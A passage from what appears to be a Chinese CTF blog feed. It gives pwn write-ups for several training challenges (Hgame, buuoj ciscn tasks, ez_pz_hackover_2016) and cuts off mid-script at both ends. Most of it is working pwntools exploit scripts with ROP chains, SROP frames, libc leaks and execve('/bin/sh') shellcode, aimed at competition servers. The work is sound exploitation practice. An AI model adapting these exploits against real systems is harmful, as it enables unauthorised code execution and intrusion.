p64(0xdeadbeef)    payload += p64(elf.plt[&#39;read&#39;])    payload += p64(pop_rdi_ret)    payload += p64(elf.bss()+0x100)    payload += p64(pop_rsi_r15_ret)    payload += p64(0)    payload += p64(0)    payload += p64(elf.plt[&#39;open&#39;])    payload += p64(pop_rdi_ret)    payload += p64(6)    payload += p64(pop_rsi_r15_ret)    payload += p64(elf.bss()+0x100)    payload += p64(0)    payload += p64(elf.plt[&#39;read&#39;])    payload += p64(pop_rdi_ret)    payload += p64(elf.bss()+0x100)    payload += p64(0x4004e0)#puts_plt    sh.sendline(payload)    sleep(0.5)    sh.recvuntil(&quot;./flag&quot;)    sh.send(&quot;./flag\x00&quot;)    sh.interactive()if __name__ ==  &quot;__main__&quot;:    pwn(&quot;47.103.214.163&quot;,20003,1 )</code></pre><h2 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h2><img src="2020/01/28/Hgame/image-20200117183339217.png" srcset="/img/loading.gif" class="" title="image-20200117183339217"><p>ROP_LEVEL0| SOLVED| ww        <img src="2020/01/28/Hgame/92YAf7bVfc8a3fUf__thumbnail" srcset="/img/loading.gif" class="" title="img">      重复利用此处的gadget调用read， open， puts将flag输出就行</p><pre><code class="python"> 1 #!/usr/bin/python2  2   3 from pwn import *  4 import sys  5 import os  6   7 #context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, terminal=[&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;])  8 context(arch=&#39;i386&#39;, os=&#39;linux&#39;, terminal=[&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;])  9 context.log_level=&#39;debug&#39; 10 debug = 0 11 d = 1 12  13 def pwn(): 14     execve = &quot;./ROP_LEVEL0&quot; 15     if debug == 1: 16         p = process(execve) 17         if d == 1: 18             gdb.attach(p) 19     else: 20         #ip = &quot;10.0.%s.140&quot; % sys.argv[1] 21         ip = &quot;47.103.214.163&quot; 22         host = &quot;20003&quot; 23         p = remote(ip, host) 24  25     elf = ELF(&quot;./ROP_LEVEL0&quot;) 26  27     main = 0x40065B 28     loc1 = 0x400730 29     loc2 = 0x40074A 30  31     payload = &#39;\x00&#39;*(0x50+8) + p64(loc2) 32     payload += p64(0) + p64(1) + p64(elf.got[&#39;read&#39;]) + p64(0x10) + p64(elf.bss()+0x200) + p64(0) + p64(loc1) 33     payload += p64(0)*7 + p64(main) 34     p.sendafter(&quot;You can not only cat flag but also Opxx Rexx Wrxxx ./flag&quot;, payload.ljust(0x100, &#39;\x00&#39;)) 35  36     p.sendline(&#39;./flag\0&#39;) 37  38     payload = &#39;\x00&#39;*(0x50+8) + p64(loc2) 39     payload += p64(0) + p64(1) + p64(elf.got[&#39;open&#39;]) + p64(0)*2 + p64(elf.bss()+0x200) + p64(loc1) 40     payload += p64(0)*7 + p64(main) 41     p.sendafter(&quot;You can not only cat flag but also Opxx Rexx Wrxxx ./flag&quot;, payload.ljust(0x100, &#39;\x00&#39;)) 42  43     raw_input() 44     payload = &#39;\x00&#39;*(0x50+8) + p64(loc2) 45     payload += p64(0) + p64(1) + p64(elf.got[&#39;read&#39;]) + p64(0x60) + p64(elf.bss()+0x220) + p64(5) + p64(loc1) 46     payload += p64(0)*7 + p64(main) 47     p.sendafter(&quot;You can not only cat flag but also Opxx Rexx Wrxxx ./flag&quot;, payload.ljust(0x100, &#39;\x00&#39;)) 48  49     payload = &#39;\x00&#39;*(0x50+8) + p64(loc2) 50     payload += p64(0) + p64(1) + p64(elf.got[&#39;puts&#39;]) + p64(0)*2 + p64(elf.bss() + 0x220) + p64(loc1) 51     payload += p64(0)*7 + p64(main) 52     p.sendafter(&quot;You can not only cat flag but also Opxx Rexx Wrxxx ./flag&quot;, payload.ljust(0x100, &#39;\x00&#39;)) 53  54     p.interactive() 55  56 if __name__ == &#39;__main__&#39;: 57     pwn()</code></pre><p><a href="http://www.qfrost.com:4000/PWN/万能gadget/" target="_blank" rel="noopener">http://www.qfrost.com:4000/PWN/%E4%B8%87%E8%83%BDgadget/</a></p><h2 id="Number-Killer"><a href="#Number-Killer" class="headerlink" title="Number_Killer"></a>Number_Killer</h2><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(void) {     //char str[20];    long str = 0x40078d;    long temp;    long number = 4196237L;    char string[20];    temp = atol(str);    printf(&quot;十进制：%d&quot;,str);    //printf(&quot;转换前：%s ,转换后：%d\n&quot;,str,atol(str));    temp = number;    itoa(number, string, 16);    //printf(&quot;转换前：%d,转换后：%s&quot;,temp,string);    return 0;}</code></pre><img src="2020/01/28/Hgame/image-20200127180305749.png" srcset="/img/loading.gif" class="" title="image-20200127180305749"><img src="2020/01/28/Hgame/image-20200127180319641.png" srcset="/img/loading.gif" class="" title="image-20200127180319641"><img src="2020/01/28/Hgame/image-20200127180517996.png" srcset="/img/loading.gif" class="" title="image-20200127180517996"><img src="2020/01/28/Hgame/image-20200127180441992.png" srcset="/img/loading.gif" class="" title="image-20200127180441992"><p>没有NX加上有jump rsp，那就肯定ret2shellcode</p><p>因为atoll，所以不能直接发shellcode</p><p>先看一下偏移</p><pre><code class="python">for i in range(20):    sh.sendline(str(i))    sleep(0.1)</code></pre><img src="2020/01/28/Hgame/image-20200127181655275.png" srcset="/img/loading.gif" class="" title="image-20200127181655275"><p>看见c,d,e,f,那里，再测一次</p><pre><code class="python">for i in range(1,13):    sh.sendline(str(i))    sleep(0.1)</code></pre><img src="2020/01/28/Hgame/image-20200127184537470.png" srcset="/img/loading.gif" class="" title="image-20200127184537470"><p>现在我们还看见了一个1，可能是用来记录循环次数的？</p><p>然后我们要构建栈，就得按照</p><pre><code class="python">gadget = [        0,        0x000000000040078D,#jmp rsp        0x622fbf4856f63148,#shellcode        0x545768732f2f6e69,        0x0000050f993bb05f,]</code></pre><p>这样来构建</p><blockquote><img src="2020/01/28/Hgame/image-20200127191618340.png" srcset="/img/loading.gif" class="" title="image-20200127191618340"></blockquote><img src="2020/01/28/Hgame/image-20200127193319645.png" srcset="/img/loading.gif" class="" title="image-20200127193319645"><p>这样我们看见那个0，好像放在了最下面，并且栈中还存留有56789a，所以把gadget修改一下</p><pre><code class="python">gadget = [        0xdeadbeef,        0x000000000040078D,#jmp rsp        0x622fbf4856f63148,#shellcode        0x545768732f2f6e69,        0x0000050f993bb05f,        0xdeadbeef,        0xdeadbeef,        0xdeadbeef,        0xdeadbeef,        0xdeadbeef,        0xdeadbeef,]</code></pre><img src="2020/01/28/Hgame/image-20200127194207809.png" srcset="/img/loading.gif" class="" title="image-20200127194207809"><p>这样就没有问题啦，然后就是如何退出循环了</p><p>这里我们可以看见循环次数已经变成了b<img src="2020/01/28/Hgame/image-20200127195248873.png" srcset="/img/loading.gif" class="" title="image-20200127195248873"></p><p>但如果我们继续发送的话，又会变成1<img src="2020/01/28/Hgame/image-20200127200302561.png" srcset="/img/loading.gif" class="" title="image-20200127200302561"></p><p>经过调试之后，只有<code>sendNum((11&lt;&lt;32))</code>可以将b+1变成c，否则会重新开始循环打乱栈内布局</p><p>随后，发送</p><pre><code class="python">for i in range(12,20):    sendNum(i)</code></pre><img src="2020/01/28/Hgame/image-20200127202553944.png" srcset="/img/loading.gif" class="" title="image-20200127202553944"><p>然后发现立马就可以运行第一行…..</p><p>我们需要把rbp指针指向之前我们放好了的地方，所以计算一下栈偏移，然后</p><pre><code class="python">a = asm(&#39;sub rsp,0x60;ret&#39;)b = disasm(a)</code></pre><img src="2020/01/28/Hgame/image-20200127205156957.png" srcset="/img/loading.gif" class="" title="image-20200127205156957"><p>所以发送<code>sendNum(0xc360ec8348)</code>再使用gitf里的<img src="2020/01/28/Hgame/image-20200127205325792.png" srcset="/img/loading.gif" class="" title="image-20200127205325792"></p><p>完成跳转</p><p>随后，程序还需要读入六个数，然后即可</p><pre><code class="python">from pwn import *context.log_level = &quot;debug&quot;context.arch = &quot;amd64&quot;sh = process(&quot;./Number_Killer&quot;)sh.recvuntil(&quot;numbers!\n&quot;)gadget = [        0xdeadbeef,        0x000000000040078D,#jmp rsp        0x622fbf4856f63148,#shellcode        0x545768732f2f6e69,        0x0000050f993bb05f,        0xdeadbeef,        0xdeadbeef,        0xdeadbeef,        0xdeadbeef,        0xdeadbeef,        0xdeadbeef,]def sendNum(num):    sh.sendline(str(num))    sleep(0.1)for i in range(11):    sh.sendline(str(i))    sleep(0.1)for i in gadget:    sendNum(i)#pause()sendNum((11&lt;&lt;32))pause()sendNum(0xc360ec8348)sendNum(0x400789)for i in range(6):    sh.sendline(str(i))    sleep(0.1)sh.interactive()</code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Hgame</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ciscn_2019_s_9</title>
    <link href="/2020/01/25/ciscn_2019_s_9/"/>
    <url>/2020/01/25/ciscn_2019_s_9/</url>
    
    <content type="html"><![CDATA[<h1 id="ciscn-2019-s-9"><a href="#ciscn-2019-s-9" class="headerlink" title="ciscn_2019_s_9"></a>ciscn_2019_s_9</h1><img src="2020/01/25/ciscn_2019_s_9/image-20200124122128279.png" srcset="/img/loading.gif" class="" title="image-20200124122128279"><p>啥保护没开，第一时间考虑shellcode</p><img src="2020/01/25/ciscn_2019_s_9/image-20200124122202333.png" srcset="/img/loading.gif" class="" title="image-20200124122202333"><img src="2020/01/25/ciscn_2019_s_9/image-20200124122235034.png" srcset="/img/loading.gif" class="" title="image-20200124122235034"><p>另外leak只有50，leak多才考虑直接走rop</p><img src="2020/01/25/ciscn_2019_s_9/image-20200124122303684.png" srcset="/img/loading.gif" class="" title="image-20200124122303684"><p>尝试过ret2libc,但是怎么都调不出来= =</p><pre><code class="python">shellcode =&#39;&#39;&#39;xor    eax,eaxpush   eaxpush   0x68732f2f #//shpush   0x6e69622f # /binmov    ebx,espmov    ecx,eaxmov    edx,eaxmov    al,0xbint    0x80xor    eax,eaxinc    eaxint    0x80&#39;&#39;&#39;shellcode =asm(shellcode) #使用shellcraft.sh打不通，估计是因为太长了shell=&quot;sub esp,0x28;call esp&quot;shell =asm(shell)sh.recvuntil(&quot;&gt;\n&quot;)payload = shellcode.ljust(0x24,&quot;\x00&quot;)payload += p32(0x8048554) #jmp esppayload += shellpause()sh.sendline(payload)</code></pre><blockquote><p>（1）xorl %eax,%eax ：使用xor指令清空eax，即使eax=0，不可以使用movl 0,%eax，因为会在shellcode中引入’0’，一些存在bufferoverflow的函数，如strcpy()，都是在源字符串中检测’0’，若遇到‘0’，默认为字符串结束，则之后的字符串不会被拷贝。<br>（2）pushl %eax ：将0入栈，标记了”/bin/sh”的结尾，用pushl也可以避免在shellcode中引入’0’<br>（3）pushl 0x68732f2f：传递”/sh”，为了4字节对齐，使用//sh，这在execve()中等同于/sh<br>（4）pushl ​0x6e69622f：传递“/bin”，为4个字节。<br>（5）movl %esp,%ebx ：此时esp指向了”/bin/sh”,通过esp将该字符串的值传递给ebx<br>（6）pushl %eax<br>        pushl %ebx ：在栈中构造Name数组，ebx存储了”/bin/sh”字符串的地址，eax中为0，作为Name[1]；<br>（7）movl %esp,%ecx :esp指向构造的Name数组，将其保存在ecx中<br>（8）cdq ：清空edx，edx中存放环境变量，0代表不传递环境变量，也可以使用xorl %edx %edx,但是该指令更长。<br>（9）movb $0x0b,%al<br>         int $0x80：eax存储系统调用号11（0x0b）,int指令调用系统调用</p><p>————————————————<br>版权声明：本文为CSDN博主「hhhnoone」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/qq_40712959/article/details/103832987" target="_blank" rel="noopener">https://blog.csdn.net/qq_40712959/article/details/103832987</a></p></blockquote><hr><p>调不出来的如下：</p><pre><code class="python"># -*- coding: utf-8 -*-from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;elf = ELF(&#39;./ciscn_s_9&#39;)lib = 0sh = 0def pwn(ip,port,debug):    global lib    global sh    if debug == 1:        sh = process(&#39;./ciscn_s_9&#39;)        lib = ELF(&#39;/lib/i386-linux-gnu/libc.so.6&#39;)    else:        sh = remote(ip,port)        lib = ELF(&#39;/home/robye/Desktop/PWN/libc/32-libc-2.27.so&#39;)    sh.recvuntil(&quot;&gt;\n&quot;)    pop2_ret = 0x080485da    payload = cyclic(36)    payload += p32(elf.plt[&#39;puts&#39;])    payload += p32(0x80484BB)    payload += p32(elf.got[&#39;__libc_start_main&#39;])    #payload += p32(0x8048559)    #payload += p32(0x80484BB)    #pause()    sh.sendline(payload)    sh.recvuntil(&quot;bye~\n&quot;)    __libc_start_main = u32(sh.recv(4))    libc = __libc_start_main - lib.symbols[&#39;__libc_start_main&#39;]    system = libc + lib.symbols[&#39;system&#39;]    binsh = libc + lib.search(&#39;/bin/sh\x00&#39;).next()    sh.recvuntil(&quot;&gt;\n&quot;)    payload = cyclic(36)    #payload += p32(0x08048359)    #payload += p32(0x080485da)#pop_rdi_ebp    payload + p32(0)    #payload += p32(system)    #payload += p32(0xdeadbeef)     #payload += p32(system)    #payload += p32(0)    #payload += p32(0xdeadbeef)    payload += p32(binsh)    #payload += &#39;cat flag&#39;    #payload += p32(0xdeadbeef)    payload += p32(system)    pause()    sh.sendline(payload)    #__free_hook = libc + lib.symbols[&#39;__free_hook&#39;]    #__malloc_hook = libc + lib.symbols[&#39;__malloc_hook&#39;]    #log.success(&quot;libc: &quot; + hex(libc))    #log.success(&quot;system: &quot; + hex(system))    #log.success(&quot;binsh: &quot; + hex(binsh))    #log.success(&quot;__free_hook: &quot; + hex(__free_hook))    #log.success(&quot;__malloc_hook: &quot; + hex(__malloc_hook))    sh.interactive()if __name__ ==  &quot;__main__&quot;:    pwn(&quot;node3.buuoj.cn&quot;,27831,1)</code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>buu</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SROP-ciscn_2019_s_3</title>
    <link href="/2020/01/23/SROP-ciscn_2019_s_3/"/>
    <url>/2020/01/23/SROP-ciscn_2019_s_3/</url>
    
    <content type="html"><![CDATA[<h1 id="SROP-ciscn-2019-s-3-es-7"><a href="#SROP-ciscn-2019-s-3-es-7" class="headerlink" title="SROP-ciscn_2019_s_3/es_7"></a>SROP-ciscn_2019_s_3/es_7</h1><p><a href="https://www.freebuf.com/articles/network/87447.html" target="_blank" rel="noopener">Sigreturn Oriented Programming (SROP) Attack攻击原理</a></p><p><a href="https://blog.csdn.net/github_36788573/article/details/103541178" target="_blank" rel="noopener">比较详细的WP</a></p><p><a href="https://www.jianshu.com/p/ca4a5dacd1a2" target="_blank" rel="noopener">https://www.jianshu.com/p/ca4a5dacd1a2</a></p><blockquote><p>两个系统调用，一个是sys_read，一个是sys_write，往栈上写数据（0x400），从栈上读数据（0x30），存在栈溢出。<br>还有一个gadget函数。</p><img src="2020/01/23/SROP-ciscn_2019_s_3/20191214171639948.png" srcset="/img/loading.gif" class="" title="在这里插入图片描述"><p>有两个值得注意的地方。mov rax,0fh 以及mov rax 59。这两个gadget控制了rax的值，看看这两个是什么系统调用。<br>15 sys_rt_sigreturn<br>59 sys_execve</p><p>解法一<br>59号系统调用是execve那么就可以想办法控制寄存器的值调用execve(“/bin/sh”,0,0)，注意在调用execve时，后面两个参数需要置0，由于需要控制rdx的值，所以选择使用通用gadget，__libc_csu_init。<img src="2020/01/23/SROP-ciscn_2019_s_3/20191214172422496.png" srcset="/img/loading.gif" class="" title="在这里插入图片描述"></p><p>r13的值会给到rdx，让rbx=0，下面call的时候会变为call [r12]，会去call r12指向位置的代码，我们可以调到后面的rop执行，所以需要知道栈的地址，我们获取/bin/sh字符串时也需要知道栈地址。这题刚好在write的时候0x28这个位置是栈上的值，于是通过计算可以得到栈上/bin/sh的地址，即rsp-0x10的值。</p><p>from pwn import *</p><p>io=process(‘pwn’)<br>main=0x0004004ED<br>execv=0x04004E2<br>pop_rdi=0x4005a3<br>pop_rbx_rbp_r12_r13_r14_r15=0x40059A<br>mov_rdxr13_call=0x0400580<br>sys_write=0x00400517</p><p>pl1=’/bin/sh\x00’*2+p64(main)<br>io.send(pl1)<br>io.recv(0x20)<br>sh=u64(io.recv(8))-280<br>print(hex(sh))</p><p>pl2=’/bin/sh\x00’<em>2+p64(pop_rbx_rbp_r12_r13_r14_r15)+p64(0)</em>2+p64(sh+0x50)+p64(0)*3<br>pl2+=p64(mov_rdxr13_call)+p64(execv)<br>pl2+=p64(pop_rdi)+p64(sh)+p64(sys_write)<br>io.send(pl2)</p><p>io.interactive()</p><p>解法2<br>15号系统调用sigreturn。这个系统调用是在终止信号恢复用户态环境时用的。那么我们在栈上伪造寄存器的值，那么恢复时就可将寄存器控制为我们想要的值。<br>具体可参考：Framing Signals—A Return to Portable Shellcode</p><p>from pwn import *</p><p>io=process(‘pwn’)<br>context.binary=’./pwn’<br>context.terminal = [‘gnome-terminal’,’-x’,’sh’,’-c’]</p><p>main=0x0004004ED<br>sigret=0x4004DA<br>sys_write=0x400517</p><p>pl1=’/bin/sh\x00’*2+p64(main)<br>io.send(pl1)<br>io.recv(0x20)<br>sh=u64(io.recv(8))-280 #sh值为binsh所在的位置<br>print(hex(sh))</p><p>frame = SigreturnFrame()<br>frame.rax = constants.SYS_execve<br>frame.rdi = sh<br>frame.rsi = 0<br>frame.rdx = 0<br>frame.rip = sys</p><p>pl1=’a’*16+p64(sigret)+p64(sys_write)+str(frame)</p><p>‘’’<br>def debug(addr):<br>   raw_input(‘debug:’)<br>   gdb.attach(io, “b *” + addr)<br>debug(‘0x400514’)<br>‘’’</p><p>pl2=’/bin/sh\x00’*2+p64(sigret)+p64(sys_write)+str(frame)<br>io.send(pl2)</p><p>io.interactive()<br>————————————————<br>版权声明：本文为CSDN博主「yudhui」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/github_36788573/article/details/103541178" target="_blank" rel="noopener">https://blog.csdn.net/github_36788573/article/details/103541178</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>buu</category>
      
      <category>备忘</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ciscn_2019_ne_5-骚骚的小东西</title>
    <link href="/2020/01/20/ciscn_2019_ne_5-%E9%AA%9A%E9%AA%9A%E7%9A%84%E5%B0%8F%E4%B8%9C%E8%A5%BF/"/>
    <url>/2020/01/20/ciscn_2019_ne_5-%E9%AA%9A%E9%AA%9A%E7%9A%84%E5%B0%8F%E4%B8%9C%E8%A5%BF/</url>
    
    <content type="html"><![CDATA[<h1 id="ciscn-2019-ne-5-骚骚的小东西"><a href="#ciscn-2019-ne-5-骚骚的小东西" class="headerlink" title="ciscn_2019_ne_5-骚骚的小东西"></a>ciscn_2019_ne_5-骚骚的小东西</h1><img src="2020/01/20/ciscn_2019_ne_5-%E9%AA%9A%E9%AA%9A%E7%9A%84%E5%B0%8F%E4%B8%9C%E8%A5%BF/image-20200120122326853.png" srcset="/img/loading.gif" class="" title="image-20200120122326853"><img src="2020/01/20/ciscn_2019_ne_5-%E9%AA%9A%E9%AA%9A%E7%9A%84%E5%B0%8F%E4%B8%9C%E8%A5%BF/image-20200120122344691.png" srcset="/img/loading.gif" class="" title="image-20200120122344691"><p>输入之后，在调用getflag这里会造成溢出</p><img src="2020/01/20/ciscn_2019_ne_5-%E9%AA%9A%E9%AA%9A%E7%9A%84%E5%B0%8F%E4%B8%9C%E8%A5%BF/image-20200120122455793.png" srcset="/img/loading.gif" class="" title="image-20200120122455793"><p>函数里调用有system，但没有/bin/sh</p><p>骚东西：<img src="2020/01/20/ciscn_2019_ne_5-%E9%AA%9A%E9%AA%9A%E7%9A%84%E5%B0%8F%E4%B8%9C%E8%A5%BF/image-20200120122604385.png" srcset="/img/loading.gif" class="" title="image-20200120122604385"></p><p>0x80482E6 + 0x4就是 sh</p><p>我们可以system(“sh”)也可以</p><p>exp:</p><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;#sh = process(&#39;ciscn_2019_ne_5&#39;)sh = remote(&quot;node3.buuoj.cn&quot;,27887)elf = ELF(&quot;./ciscn_2019_ne_5&quot;)lib = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)pop_ret = 0x08048455sh.sendline(&quot;administrator&quot;)system = elf.plt[&#39;system&#39;]binsh = (0x80482E6 + 0x4)sh.sendline(&quot;1&quot;)payload = cyclic(0x48)payload += p32(pop_ret)payload += p32(system)payload += p32(0xdeadbeef)payload += p32(binsh)#pause()sh.sendline(payload)sh.sendline(&quot;4&quot;)sh.interactive()</code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>buu</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ez_pz_hackover_2016-继续深入学习edb</title>
    <link href="/2020/01/18/ez_pz_hackover_2016-%E7%BB%A7%E7%BB%AD%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0edb/"/>
    <url>/2020/01/18/ez_pz_hackover_2016-%E7%BB%A7%E7%BB%AD%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0edb/</url>
    
    <content type="html"><![CDATA[<h1 id="ez-pz-hackover-2016-继续深入学习edb"><a href="#ez-pz-hackover-2016-继续深入学习edb" class="headerlink" title="ez_pz_hackover_2016-继续深入学习edb"></a>ez_pz_hackover_2016-继续深入学习edb</h1><img src="2020/01/18/ez_pz_hackover_2016-%E7%BB%A7%E7%BB%AD%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0edb/image-20200118225637137.png" srcset="/img/loading.gif" class="" title="image-20200118225637137"><img src="2020/01/18/ez_pz_hackover_2016-%E7%BB%A7%E7%BB%AD%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0edb/image-20200118225650607.png" srcset="/img/loading.gif" class="" title="image-20200118225650607"><img src="2020/01/18/ez_pz_hackover_2016-%E7%BB%A7%E7%BB%AD%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0edb/image-20200118225709949.png" srcset="/img/loading.gif" class="" title="image-20200118225709949"><img src="2020/01/18/ez_pz_hackover_2016-%E7%BB%A7%E7%BB%AD%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0edb/image-20200118225720760.png" srcset="/img/loading.gif" class="" title="image-20200118225720760"><img src="2020/01/18/ez_pz_hackover_2016-%E7%BB%A7%E7%BB%AD%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0edb/image-20200118225751402.png" srcset="/img/loading.gif" class="" title="image-20200118225751402"><p>得先绕过result的strcmp</p><pre><code class="python">sh.recvuntil(&quot;&gt;&quot;)payload = &quot;crashme&quot;payload = payload.ljust(10,&quot;\x00&quot;)payload += cyclic(200)pause()sh.sendline(payload)</code></pre><p>pause时，打开edb并attach ez_pz_hackover_2016</p><p>我常用：f8单步运行，ctrl+f9直接跳到ret，shift+f7进入函数运行</p><blockquote><img src="2020/01/18/ez_pz_hackover_2016-%E7%BB%A7%E7%BB%AD%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0edb/image-20200118230956502.png" srcset="/img/loading.gif" class="" title="image-20200118230956502"></blockquote><p>一直运行到不能运行</p><img src="2020/01/18/ez_pz_hackover_2016-%E7%BB%A7%E7%BB%AD%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0edb/image-20200118230622786.png" srcset="/img/loading.gif" class="" title="image-20200118230622786"><p>计算得偏移为16。</p><p>然后，一开始给出了&amp;s的地址，加上没有打开nx。我们就可以在memcpy，溢出之后，将返回指针指向&amp;s里的shellcode</p><img src="2020/01/18/ez_pz_hackover_2016-%E7%BB%A7%E7%BB%AD%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0edb/image-20200118231945729.png" srcset="/img/loading.gif" class="" title="image-20200118231945729"><p>一直运行到vuln的ret之后，我们看见了返回地址时0xffb64b7c,然后我们的shellcode在0xffb64b60，所以偏移就是0xffb64b7c-0xffb64b60 = 0x1c </p><p>得exp</p><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;sh = process(&#39;ez_pz_hackover_2016&#39;)#sh = remote(&quot;node3.buuoj.cn&quot;,27058)elf = ELF(&quot;./ez_pz_hackover_2016&quot;)lib = ELF(&quot;/lib/ld-linux.so.2&quot;)sh.recvuntil(&quot;crash: &quot;)s_addr = int(sh.recvuntil(&quot;\n&quot;,True),16)sh.recvuntil(&quot;&gt;&quot;)payload = &quot;crashme&quot;payload = payload.ljust(10,&quot;\x00&quot;)payload += cyclic(16)payload += p32(s_addr - 0x1c)payload += asm(shellcraft.sh())pause()sh.sendline(payload)sh.interactive()</code></pre><p>还有种ret2libc的</p><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;#sh = process(&#39;ez_pz_hackover_2016&#39;)sh = remote(&quot;node3.buuoj.cn&quot;,29601)elf = ELF(&quot;./ez_pz_hackover_2016&quot;)#lib = ELF(&quot;/lib/ld-linux.so.2&quot;)lib = ELF(&quot;/home/mrbelieve/Desktop/PWN/buu/libc/32-libc-2.23.so&quot;)chall_addr = 0x8048603sh.recvuntil(&quot;&gt;&quot;)payload = &quot;crashme&quot;payload = payload.ljust(10,&quot;\x00&quot;)payload += cyclic(16)payload += p32(elf.plt[&#39;printf&#39;])payload += p32(chall_addr) payload +=  p32(elf.got[&#39;printf&#39;])sh.sendline(payload)sh.recvuntil(&quot;crashme!\n&quot;)printf_addr = u32(sh.recv(4))log.success(&quot;printf_addr ----&gt; &quot; + hex(printf_addr))libc = printf_addr - lib.sym[&#39;printf&#39;]log.success(&quot;libc ----&gt; &quot; + hex(libc))system = lib.sym[&#39;system&#39;] + libcbinsh = lib.search(&quot;/bin/sh\x00&quot;).next() + libcsh.recvuntil(&quot;&gt;&quot;)payload = &quot;crashme&quot;payload = payload.ljust(10,&quot;\x00&quot;)payload += cyclic(16)payload += p32(system)payload += p32(0xdeadbeef)payload += p32(binsh)sh.sendline(payload)sh.interactive()</code></pre><p>借鉴:<a href="https://sh1ner.github.io/2019/09/13/buuctf-pwn/#more" target="_blank" rel="noopener">[sh1ner’s blog]</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>buu</category>
      
      <category>备忘</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>栈迁移</title>
    <link href="/2020/01/15/%E6%A0%88%E8%BF%81%E7%A7%BB/"/>
    <url>/2020/01/15/%E6%A0%88%E8%BF%81%E7%A7%BB/</url>
    
    <content type="html"><![CDATA[<h1 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h1><p>劫持一次流程，覆盖一次ebp</p><p>栈迁移后跳到read</p><p>正常Rop到libc，再rop，再到libc</p><p>rop到libc，由于跳到read上，后面可以继续任意地址跳转</p><p>pop_ret</p><p>leave_ret  </p><p>payload += elf.plt[‘puts’]</p><p>payload += p32(pop_ebp_ret)</p><p>payload += p32(elf.got[“__libc_start”])</p><p>payload += addr</p><p>payload += p32(leave_ret)</p><p><img src="C:%5CUsers%5Cholysheep%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200109225539782.png" srcset="/img/loading.gif" alt="image-20200109225539782"></p><p><img src="C:%5CUsers%5Cholysheep%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200109225754002.png" srcset="/img/loading.gif" alt="image-20200109225754002"></p><p><img src="C:%5CUsers%5Cholysheep%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200109225805110.png" srcset="/img/loading.gif" alt="image-20200109225805110"></p><p><img src="C:%5CUsers%5Cholysheep%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200109231149390.png" srcset="/img/loading.gif" alt="image-20200109231149390"></p><p>没调用函数，函数的got值指向用户代码段，若被执行过会指向libc该函数的</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>常用</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ROPgadget-not_the_same_3dsctf_2016</title>
    <link href="/2020/01/14/ROPgadget-not_the_same_3dsctf_2016/"/>
    <url>/2020/01/14/ROPgadget-not_the_same_3dsctf_2016/</url>
    
    <content type="html"><![CDATA[<h1 id="ROPgadget-not-the-same-3dsctf-2016"><a href="#ROPgadget-not-the-same-3dsctf-2016" class="headerlink" title="ROPgadget-not_the_same_3dsctf_2016"></a>ROPgadget-not_the_same_3dsctf_2016</h1><p><code>ROPgadget --binary not_the_same_3dsctf_2016 --ropchain</code></p><p>自动生成</p><pre><code class="python">from struct import packp = &#39;&#39;p += pack(&#39;&lt;I&#39;, 0x0806fcca) # pop edx ; retp += pack(&#39;&lt;I&#39;, 0x080eb060) # @ .datap += pack(&#39;&lt;I&#39;, 0x08048b0b) # pop eax ; retp += &#39;/bin&#39;p += pack(&#39;&lt;I&#39;, 0x0805586b) # mov dword ptr [edx], eax ; retp += pack(&#39;&lt;I&#39;, 0x0806fcca) # pop edx ; retp += pack(&#39;&lt;I&#39;, 0x080eb064) # @ .data + 4p += pack(&#39;&lt;I&#39;, 0x08048b0b) # pop eax ; retp += &#39;//sh&#39;p += pack(&#39;&lt;I&#39;, 0x0805586b) # mov dword ptr [edx], eax ; retp += pack(&#39;&lt;I&#39;, 0x0806fcca) # pop edx ; retp += pack(&#39;&lt;I&#39;, 0x080eb068) # @ .data + 8p += pack(&#39;&lt;I&#39;, 0x08049423) # xor eax, eax ; retp += pack(&#39;&lt;I&#39;, 0x0805586b) # mov dword ptr [edx], eax ; retp += pack(&#39;&lt;I&#39;, 0x080481ad) # 